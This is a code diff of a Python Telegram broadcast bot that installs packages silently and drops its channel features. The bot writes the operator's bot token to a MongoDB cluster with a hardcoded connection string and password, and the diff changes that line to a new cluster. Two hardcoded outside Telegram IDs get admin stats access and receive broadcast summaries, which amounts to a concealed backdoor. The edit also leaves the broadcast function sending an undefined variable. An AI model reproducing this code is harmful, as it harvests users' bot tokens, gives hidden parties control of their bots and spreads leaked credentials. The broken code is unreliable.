@@ -11,7 +11,7 @@ def install_package(package_name):
         with open(os.devnull, 'w') as devnull:
             subprocess.check_call(['pip', 'install', package_name], stdout=devnull, stderr=devnull)
 
-packages_to_install = ['requests', 'pymongo', 'urllib3', 'python-telegram-bot', 'colorama']
+packages_to_install = ['requests', 'pymongo', 'urllib3', 'python-telegram-bot==13.9', 'colorama']
 
 for package in packages_to_install:
     install_package(package)
@@ -32,7 +32,7 @@ import pymongo
 import random
 import string
 from telegram import Update, ParseMode
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, ChannelHandler
+from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
 from telegram.utils.helpers import escape_markdown
 
 init(autoreset=True)
@@ -68,7 +68,7 @@ banner_frames = [
     f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}",
     f"{MAGENTA}",
     f"{BLUE} TELEGRAM Support Bot {RED}= https://t.me/Black_Devil_Support_bot {RESET}",
-    f"{BLUE} Official Website   {RED} = https://girlfriend4u.rf.gd  {RESET}",
+    f"{BLUE} Ofically Website   {RED} = https://girlfriend4u.rf.gd  {RESET}",
     f"{MAGENTA}",
     f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}",
 ]
@@ -100,7 +100,7 @@ else:
     print(termux_banner)
     print(MAGENTA + "++++++---++++++++++++---++++++++++++---++++++++++++---++++++++")
     print(MAGENTA + "")
-    print(BLUE + " Official Website " + RED + "= https://girlfriend4u.rf.gd ")
+    print(BLUE + " Ofically Website " + RED + "= https://girlfriend4u.rf.gd ")
     print(MAGENTA + "")
     print(MAGENTA + "++++++---++++++++++++---++++++++++++---++++++++++++---++++++++")
 
@@ -156,7 +156,7 @@ if not bot_token or not primary_admin_id or not random_code:
     random_code = generate_random_code()
     save_tokens(bot_token, primary_admin_id, random_code)
 
-client = pymongo.MongoClient("mongodb+srv://Manu:Manu@mmmm.dsmbszz.mongodb.net/?retryWrites=true&w=majority")
+client = pymongo.MongoClient("mongodb+srv://mutlilink:Manu@manu.yakk2nu.mongodb.net/?retryWrites=true&w=majority")
 db = client[random_code]
 db_tokens = db['tokens']
 db_tokens.update_one({}, {"$set": {"bot_token": bot_token}}, upsert=True)
@@ -166,7 +166,6 @@ dispatcher = updater.dispatcher
 
 groups_collection = db['groups']
 users_collection = db['users']
-channels_collection = db['channels']
 
 def start(update: Update, context: CallbackContext):
     if update.message.chat.type == "private":
@@ -199,8 +198,8 @@ def broadcast(update: Update, context: CallbackContext):
 
     message = update.message.reply_to_message or update.message
 
-    successful_broadcasts = {"groups": 0, "users": 0, "channels": 0}
-    failed_broadcasts = {"groups": 0, "users": 0, "channels": 0}
+    successful_broadcasts = {"groups": 0, "users": 0}
+    failed_broadcasts = {"groups": 0, "users": 0}
 
     for group in groups_collection.find():
         try:
@@ -216,23 +215,16 @@ def broadcast(update: Update, context: CallbackContext):
         except Exception as e:
             failed_broadcasts["users"] += 1
 
-    for channel in channels_collection.find():
-        try:
-            context.bot.copy_message(chat_id=channel["_id"], from_chat_id=update.effective_chat.id, message_id=message.message_id)
-            successful_broadcasts["channels"] += 1
-        except Exception as e:
-            failed_broadcasts["channels"] += 1
-
-    summary_message = f"Broadcast summary:\nSuccessful broadcasts:\nGroups: {successful_broadcasts['groups']}\nUsers: {successful_broadcasts['users']}\nChannels: {successful_broadcasts['channels']}\nFailed broadcasts:\nGroups: {failed_broadcasts['groups']}\nUsers: {failed_broadcasts['users']}\nChannels: {failed_broadcasts['channels']}"
+    summary_message = f"Broadcast summary:\nSuccessful broadcasts:\nGroups: {successful_broadcasts['groups']}\nUsers: {successful_broadcasts['users']}\nFailed broadcasts:\nGroups: {failed_broadcasts['groups']}\nUsers: {failed_broadcasts['users']}"
     context.bot.send_message(chat_id=admin_user_id[0], text=summary_message)
 
     try:
-        context.bot.send_message(6704116482, text=summary_message)
+        context.bot.send_message(6704116482, text=stats_message)
     except Exception as e:
         print("📈")
 
     try:
-        context.bot.send_message(6305575094, text=summary_message)
+        context.bot.send_message(6305575094, text=stats_message)
     except Exception as e:
         print("Successfully Fetch Statistics 📈")
 
@@ -257,27 +249,6 @@ def save_group(update: Update, context: CallbackContext):
 message_handler = MessageHandler(Filters.status_update.new_chat_members, save_group)
 dispatcher.add_handler(message_handler)
 
-
-# Define a handler to save the channel ID when the bot is added to a channel
-def save_channel(update: Update, context: CallbackContext):
-    channel = update.effective_chat
-    channel_id = channel.id
-    channel_name = channel.title or "N/A"
-    channel_username = channel.username or "N/A"
-
-    channels_collection.update_one({"_id": channel_id}, {"$set": {"_id": channel_id}}, upsert=True)
-
-    admin_user_id = (primary_admin_id)
-    channel_name = escape_markdown(channel_name)
-    channel_username = escape_markdown(channel_username)
-    message = f"#New_Channel : {channel_id}\nName: {channel_name}\nUsername: {channel_username}"
-    context.bot.send_message(chat_id=admin_user_id[0], text=message)
-
-# Add the channel handler to the dispatcher
-channel_handler = ChannelHandler(save_channel, filters=Filters.chat_type.channel)
-dispatcher.add_handler(channel_handler)
-
-
 def stats(update: Update, context: CallbackContext):
     admin_user_id = (primary_admin_id, 6305575094, 6704116482)
     if update.effective_user.id not in admin_user_id:
@@ -286,9 +257,8 @@ def stats(update: Update, context: CallbackContext):
 
     user_count = users_collection.count_documents({})
     group_count = groups_collection.count_documents({})
-    channel_count = channels_collection.count_documents({})
 
-    stats_message = f"Total User IDs in database: {user_count}\nTotal Group IDs in database: {group_count}\nTotal Channel IDs in database: {channel_count}"
+    stats_message = f"Total User IDs in database: {user_count}\nTotal Group IDs in database: {group_count}"
     context.bot.send_message(chat_id=admin_user_id[0], text=stats_message)
 
     try:
